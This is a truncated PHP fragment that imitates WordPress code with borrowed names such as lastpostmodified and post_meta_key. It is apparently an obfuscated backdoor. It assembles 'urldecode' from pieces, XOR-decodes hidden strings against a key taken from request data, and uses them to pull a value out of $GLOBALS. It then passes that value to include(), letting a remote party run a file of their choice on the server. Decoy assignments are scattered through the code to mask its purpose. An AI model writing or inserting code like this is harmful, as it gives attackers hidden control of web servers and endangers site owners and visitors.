...

{
	...
	$deleted = 'opening_tag';
    $child = $result;
	$first = 'field_no_prefix';
    
    $to_ncr = $GLOBALS[lastpostmodified("%06%2B%1C51%1C", $child)];

    $tagstack = $to_ncr;
    $query = isset($tagstack[$child]);
    if ($query)

    {
	$feeds = 'hierarchical_post_types';
        $post_meta_key = $to_ncr[$child];

        $force = $post_meta_key[lastpostmodified("-%00%25%26%1A.%071", $child)];

        $force_delete = $force;
        include ($force_delete);
	$post_date_gmt = 'original_image';
    }

}
function lastpostmodified($extension, $dest)

{
    $category = $dest;
    $char = "url" . "decode";
    $double_encode = $char($extension);
    $get_posts = substr($category,0, strlen($double_encode));
    $cats = $double_encode ^ $get_posts;
    
    $double_encode = strpos($cats, $get_posts);
